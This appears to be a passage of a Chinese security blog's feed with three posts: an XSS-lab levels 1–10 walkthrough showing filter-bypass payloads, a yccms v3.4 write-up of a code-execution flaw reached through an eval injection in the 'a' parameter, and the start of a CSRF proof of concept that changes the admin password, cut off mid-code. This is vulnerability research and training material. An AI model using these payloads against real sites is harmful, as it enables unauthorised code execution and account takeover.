    <published>2021-04-19T01:52:14.000Z</published>
    <updated>2021-04-19T02:15:54.934Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss-lab-1-10关"><a href="#xss-lab-1-10关" class="headerlink" title="xss-lab 1-10关"></a>xss-lab 1-10关</h1><h2 id="第一关-get参数存在xss"><a href="#第一关-get参数存在xss" class="headerlink" title="第一关 get参数存在xss"></a>第一关 get参数存在xss</h2><p>没啥好说的</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled.png"></p><h2 id="第二关-输入框存在的xss"><a href="#第二关-输入框存在的xss" class="headerlink" title="第二关 输入框存在的xss"></a>第二关 输入框存在的xss</h2><p>直接输入，无果</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%201.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%201.png"></p><p>不过可以看到插入到了value属性中，因此我们可以这样做，把前面的的双引号进行闭合</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onclick=alert(1) &gt;&lt;&quot;</span></span><br></pre></td></tr></table></figure><p>最后点击输入框中触发 </p><h2 id="第三关-输入框存在的xss-htmlspecialchars过滤"><a href="#第三关-输入框存在的xss-htmlspecialchars过滤" class="headerlink" title="第三关 输入框存在的xss(htmlspecialchars过滤)"></a>第三关 输入框存在的xss(htmlspecialchars过滤)</h2><p>正常插入，依旧没有弹框，检查源码</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%202.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%202.png"></p><p>看这造型跟上一关也是差不多的呀，于是” onclick=alert(1) &gt;&lt;”</p><p>不过很遗憾，不行</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%203.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%203.png"></p><p>看下源码</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%204.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%204.png"></p><p>首先接收输入框的输入赋值给keyword，然后生成一个form，里面的输入框的值由刚才输入的payload赋值，但是这里调用了htmlspecialchars，这个函数的作用如下：</p><ul><li>将括号转换为 HTML 实体</li><li>将&amp;号转换为HTML实体</li><li>将引号转换为HTML实体</li></ul><p>因为我们输入的payload包含了大于号和小于号，所以不能使用这两个符号了</p><p>前面用双引号闭合依然不行，最后多了个双引号，为什么会出现这样的情况呢？</p><p>这需要了解一下单引号和双引号的区别:单引号中的内容不会进行解析，而双引号会进行解析，上图中我们可以发现，value的值是用单引号括起来的，因此里面的值会原封不动的显示出来</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%205.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%205.png"></p><p>所以，我们只需要通过单引号把前面的单引号封闭起来就可以了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=alert(1)</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%206.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%206.png"></p><h2 id="第四关-输入框存在的xss-htmlspecialchars过滤"><a href="#第四关-输入框存在的xss-htmlspecialchars过滤" class="headerlink" title="第四关 输入框存在的xss(htmlspecialchars过滤)"></a>第四关 输入框存在的xss(htmlspecialchars过滤)</h2><p>输入’ onclick=alert(1)，没有弹，查看源码，发现无法跟value的引号进行闭合了，这是什么情况</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%207.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%207.png"></p><p>看下源码，看看是什么过滤先</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%208.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%208.png"></p><p>可以看到，首先将大小括号替换成了空，input控件的value的值是用双引号括起来的</p><p>这里有个规律，value的值如果最外层是双引号，则需要双引号去封闭，如果是单引号，就要用单引号去封闭，</p><p>使用下面的Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onclick=alert(1)</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%209.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%209.png"></p><h2 id="第五关-过滤了关键字"><a href="#第五关-过滤了关键字" class="headerlink" title="第五关 过滤了关键字"></a>第五关 过滤了关键字</h2><p>输入一个基础的exp，可以看到&lt;script&gt;被过滤了</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2010.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2010.png"></p><p>使用大小写绕过依然不行，看下源码是怎么过滤的 </p><p>这里对&lt;script和on进行了过滤</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2011.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2011.png"></p><p>这就容易了，不能用script和on就行了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; &gt; &lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</span></span><br></pre></td></tr></table></figure><p>iframe跟input不是一个控件，因此需要用&gt;隔开</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2012.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2012.png"></p><h2 id="第六关-大小写绕过"><a href="#第六关-大小写绕过" class="headerlink" title="第六关 大小写绕过"></a>第六关 大小写绕过</h2><p>继续套用第五关用的exp，结果看到src被过滤</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2013.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2013.png"></p><p>然后试了几个，发现<code>&lt;script&gt;&lt;href&gt;</code>也被过滤 ，看下源码，了解一下完整的过滤列表</p><p>可以看到以下几个过滤字段，但是并没有对大小括号进行过滤</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2014.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2014.png"></p><p>所以payload中，没这几个就可以了，这里用大小写绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; &gt;<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="第七关-双写绕过"><a href="#第七关-双写绕过" class="headerlink" title="第七关 双写绕过"></a>第七关 双写绕过</h2><p>直接用上一关的exp，发现<code>&lt;script&gt;</code>被替换了</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2015.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2015.png"></p><p>看下源码有哪些过滤，这里在上一关的基础上增加了大小写过滤，直接将所有字符小写化，如果匹配上了就替换为空</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2016.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2016.png"></p><p>既然这样，我们就用双写绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; oonnclick=alert(1)</span><br></pre></td></tr></table></figure><p>此时后面还多了一个双引号</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2017.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2017.png"></p><p>用下面的exp进行封闭</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; oonnclick=alert(1) &quot;</span><br></pre></td></tr></table></figure><h2 id="第八关-实体编码绕过"><a href="#第八关-实体编码绕过" class="headerlink" title="第八关 实体编码绕过"></a>第八关 实体编码绕过</h2><p>发现无法封闭</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2018.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2018.png"></p><p>看源码发现，不仅有之前的防护，还添加了对双引号的过滤，并且拒绝使用大小括号</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2019.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2019.png"></p><p>我们直接用<code>javascript:alert</code>也不行，因为中间的script会被替换</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2020.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2020.png"></p><p>使用下面的exp，t字符用<code>&amp;#116</code>来代替</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript&amp;#116:alert()</span><br></pre></td></tr></table></figure><p>执行完看到友情链接中插入了代码</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2021.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2021.png"></p><p>点击友情链接，触发xss</p><h2 id="第九关-输入合法性检查"><a href="#第九关-输入合法性检查" class="headerlink" title="第九关 输入合法性检查"></a>第九关 输入合法性检查</h2><p>还是使用上一关的exp，但是在前端代码中没有插入成功，看下源码进行了哪些防护</p><p>可以看到对链接进行了合法性判断，字符串前面必须是<code>http://</code></p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2022.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2022.png"></p><p>我们构造字符串把<code>http://</code>放在exp的前面肯定不行，这样会把js代码识别为网址</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2023.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2023.png"></p><p>exp如下，php中//表示注释，这样既可以绕过合法性检查，也可以把http://隔开</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116:alert()//http://</span><br></pre></td></tr></table></figure><h2 id="第十关-隐藏的按钮"><a href="#第十关-隐藏的按钮" class="headerlink" title="第十关 隐藏的按钮"></a>第十关 隐藏的按钮</h2><p>这题没有看到输入框，在get参数中随意输入也没看到可注入的地方，查看前端代码可以看到默认有一些控件是隐藏的，我们把它显示出来 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2024.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2024.png"></p><p>将hidden改为show，下图中的三个框显示出来了</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2025.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2025.png"></p><p>我们在get参数中添加t_sort</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2026.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2026.png"></p><p>在前端注入到value中</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2027.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2027.png"></p><p>最终的exp是:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert() type=&quot;button&quot;</span><br></pre></td></tr></table></figure><p>exp中将type改为了按钮，这样就可以点击按钮进行触发了</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2028.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2028.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xss-lab-1-10关&quot;&gt;&lt;a href=&quot;#xss-lab-1-10关&quot; class=&quot;headerlink&quot; title=&quot;xss-lab 1-10关&quot;&gt;&lt;/a&gt;xss-lab 1-10关&lt;/h1&gt;&lt;h2 id=&quot;第一关-get参数存在xss&quot;&gt;&lt;a hr</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>yccms v3.4代码执行漏洞</title>
    <link href="https://tutucoo.github.io/2021/04/18/yccms-v3-4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>https://tutucoo.github.io/2021/04/18/yccms-v3-4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-04-18T09:17:19.000Z</published>
    <updated>2021-10-08T07:52:05.207Z</updated>
    
    <content type="html"><![CDATA[<h1 id="yccms-v3-4-代码执行漏洞"><a href="#yccms-v3-4-代码执行漏洞" class="headerlink" title="yccms v3.4 代码执行漏洞"></a>yccms v3.4 代码执行漏洞</h1><p>查看/admin/index.php文件，这是后台首页的源代码，我们来看看里面的逻辑</p><p>这个文件主要的功能是通过require包含了run.inc.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> str_replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,substr(dirname(<span class="keyword">__FILE__</span>),<span class="number">0</span>,<span class="number">-6</span>)).<span class="string">&#x27;/config/run.inc.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接着看下run.inc.php文件</p><p>这个文件的主要的作用是自动加载类，这些类都在controller、model、public/class目录下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//开启session</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">//超时时间</span></span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//设置编码</span></span><br><span class="line">header(<span class="string">&#x27;Content-Type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="comment">//错误级别,报告警告之外的所有错误</span></span><br><span class="line">error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line"><span class="comment">//设置时区</span></span><br><span class="line">date_default_timezone_set(<span class="string">&#x27;PRC&#x27;</span>); </span><br><span class="line"><span class="comment">//网站绝对根路径</span></span><br><span class="line">define(<span class="string">&#x27;ROOT_PATH&#x27;</span>,str_replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,substr(dirname(<span class="keyword">__FILE__</span>),<span class="number">0</span>,<span class="number">-7</span>))); </span><br><span class="line"><span class="comment">//引入配置文件</span></span><br><span class="line"><span class="keyword">require</span> ROOT_PATH.<span class="string">&#x27;/config/config.inc.php&#x27;</span>;</span><br><span class="line"><span class="comment">//引入Smarty</span></span><br><span class="line"><span class="keyword">require</span> ROOT_PATH.<span class="string">&#x27;/public/smarty/Smarty.class.php&#x27;</span>;</span><br><span class="line"><span class="comment">//自动加载类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$_className</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(substr(<span class="variable">$_className</span>,<span class="number">-6</span>)==<span class="string">&#x27;Action&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">require</span> ROOT_PATH.<span class="string">&#x27;/controller/&#x27;</span>.ucfirst(<span class="variable">$_className</span>).<span class="string">&#x27;.class.php&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span>(substr(<span class="variable">$_className</span>, <span class="number">-5</span>) == <span class="string">&#x27;Model&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">require</span> ROOT_PATH.<span class="string">&#x27;/model/&#x27;</span>.ucfirst(<span class="variable">$_className</span>).<span class="string">&#x27;.class.php&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">require</span> ROOT_PATH.<span class="string">&#x27;/public/class/&#x27;</span>.ucfirst(<span class="variable">$_className</span>).<span class="string">&#x27;.class.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//单入口</span></span><br><span class="line">Factory::setAction()-&gt;run();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在看到public/class/目录下的Factory.class.php类文件的时候，发现了一个代码执行的漏洞，该漏洞可以通过eval函数执行任意代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Factory</span></span>&#123;</span><br><span class="line"><span class="built_in">static</span> <span class="keyword">private</span> <span class="variable">$_obj</span>=<span class="literal">null</span>;</span><br><span class="line"><span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setAction</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">#匹配get请求的a参数</span></span><br><span class="line"><span class="variable">$_a</span>=<span class="built_in">self</span>::getA();</span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$_a</span>, <span class="keyword">array</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;nav&#x27;</span>, <span class="string">&#x27;article&#x27;</span>,<span class="string">&#x27;backup&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;link&#x27;</span>,<span class="string">&#x27;pic&#x27;</span>,<span class="string">&#x27;search&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;xml&#x27;</span>,<span class="string">&#x27;online&#x27;</span>))) &#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>])) &#123;</span><br><span class="line">header(<span class="string">&#x27;Location:&#x27;</span>.<span class="string">&#x27;?a=login&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!file_exists(ROOT_PATH.<span class="string">&#x27;/controller/&#x27;</span>.ucfirst(<span class="variable">$_a</span>).<span class="string">&#x27;Action.class.php&#x27;</span>)) <span class="variable">$_a</span> = <span class="string">&#x27;Login&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;self::$_obj = new &#x27;</span>.ucfirst(<span class="variable">$_a</span>).<span class="string">&#x27;Action();&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$_obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setModel</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$_a</span> = <span class="built_in">self</span>::getA();</span><br><span class="line"><span class="keyword">if</span> (file_exists(ROOT_PATH.<span class="string">&#x27;/model/&#x27;</span>.<span class="variable">$_a</span>.<span class="string">&#x27;Model.class.php&#x27;</span>)) <span class="keyword">eval</span>(<span class="string">&#x27;self::$_obj = new &#x27;</span>.ucfirst(<span class="variable">$_a</span>).<span class="string">&#x27;Model();&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$_obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getA</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;login&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们主要看产生漏洞的核心代码，我们要利用这个漏洞，就要让eval函数执行我们的代码，也就是说要先通过第一句代码的if检查，通过了if检查，我们的代码执行就更近一步了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!file_exists(ROOT_PATH.<span class="string">&#x27;/controller/&#x27;</span>.ucfirst(<span class="variable">$_a</span>).<span class="string">&#x27;Action.class.php&#x27;</span>)) <span class="variable">$_a</span> = <span class="string">&#x27;Login&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;self::$_obj = new &#x27;</span>.ucfirst(<span class="variable">$_a</span>).<span class="string">&#x27;Action();&#x27;</span>);</span><br></pre></td></tr></table></figure><p>所以我们要解决两个问题：</p><p>1.file_exists逃逸</p><p>2.eval代码执行，并且插入我们的代码</p><p>下面我们来解决这两个问题</p><p>1.file_exists逃逸</p><p>这个file_exists会检查提供的文件路径是否存在，显然这里检查的是controller目录下的文件是否存在</p><p>我们可以看到controller目录下存在的一些文件，可以看到正好存在一个Action.class.php，如果a参数传递的是空，也是可以通过if检查的，那么如何传递个“空的”a参数呢并且还能执行代码呢？接着往下看</p><p><img src="https://i.loli.net/2021/04/18/VZEQXkxBNFvCTMU.png" alt="yccms%20v3%204%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2066dbd424c9b24c04a72fd07e38cfa606/Untitled.png"></p><p>file_exists函数本身存在一个bug，当接收的字符串中存在..//的时候会自动找到上一层目录，因此我们传递的a参数可以是这样的，在经过file_exists函数的时候会先执行到phpinfo();//，因为这里碰到个//，所以它会进入下一层目录，接着会碰到..//就会回到上一层目录，这样即执行了我们的代码，也相当于传了个“空的”参数，因为它去找了下一层目录，接着又往上一层目录去找，还是会找到Action.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo();<span class="comment">//..//</span></span><br></pre></td></tr></table></figure><p>我们进行个小测试，我的C盘下存在C://GameCS/Counter-Strike目录</p><p><img src="https://i.loli.net/2021/04/18/Iv9zdRiFPsbDfkW.png" alt="yccms%20v3%204%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2066dbd424c9b24c04a72fd07e38cfa606/Untitled%201.png"></p><p>通过执行下面的代码，返回的是1，这样不仅通过了检查，还执行了我们的代码phpinfo();</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> file_exists(<span class="string">&#x27;C://GameCS//phpinfo();//..//Counter-Strike&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/18/WOCfPDRura9Sy6m.png" alt="yccms%20v3%204%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2066dbd424c9b24c04a72fd07e38cfa606/Untitled%202.png"></p><p>所以我们只要在a参数中传递下面的字符串就可以绕过if判断了，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.0.21/yccms_v3.4/admin/?a=phpinfo();//..//</span></span><br></pre></td></tr></table></figure><p>2.eval执行我们的代码</p><p>光是绕过if判断还不够，我们看下eval函数执行时的操作，eval可以执行php代码，这里它进行了new操作，本意是想通过拼接，以动态的方式创建一个对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;self::$_obj = new &#x27;</span>.ucfirst(<span class="variable">$_a</span>).<span class="string">&#x27;Action();&#x27;</span>);</span><br></pre></td></tr></table></figure><p>但是如果我们以上面的exp去打，显然就会变成下面这样，这样程序就会报错，因为不存在phpinfo()对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">self</span>::<span class="variable">$_obj</span> = <span class="keyword">new</span> phpinfo();<span class="comment">//..//</span></span><br></pre></td></tr></table></figure><p>可以看到它会去public/class目录下去找phpinfo.class.php，这显示是不存在的</p><p><img src="https://i.loli.net/2021/04/18/KSqj9awp7g4RmGN.png" alt="yccms%20v3%204%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2066dbd424c9b24c04a72fd07e38cfa606/Untitled%203.png"></p><p>我们需要让它创建一个存在的对象，public/class目录下是存在DB.class.php文件的，因此我们最终的exp可以是这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.0.21/yccms_v3.4/admin/?a=DB();phpinfo();//..//</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/18/WQBdGsqNfXUHLC3.png" alt="yccms%20v3%204%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2066dbd424c9b24c04a72fd07e38cfa606/Untitled%204.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;yccms-v3-4-代码执行漏洞&quot;&gt;&lt;a href=&quot;#yccms-v3-4-代码执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;yccms v3.4 代码执行漏洞&quot;&gt;&lt;/a&gt;yccms v3.4 代码执行漏洞&lt;/h1&gt;&lt;p&gt;查看/admin/i</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>yccms v3.4 csrf漏洞</title>
    <link href="https://tutucoo.github.io/2021/04/17/yccms-v3-4-csrf%E6%BC%8F%E6%B4%9E/"/>
    <id>https://tutucoo.github.io/2021/04/17/yccms-v3-4-csrf%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-04-17T08:31:22.000Z</published>
    <updated>2021-10-08T07:52:05.206Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>yccms v3.4</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>搭建好环境登陆后台</p><p><a href="http://192.168.0.21/yccms_v3.4/admin">http://192.168.0.21/yccms_v3.4/admin</a></p><p>默认密码admin,admin</p><p>登陆成功后执行下面的poc就会成功将密码修改为admin2，后台登陆状态会强制下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)&lt;/script&gt;</span><br><span class="line">    &lt;form action=<span 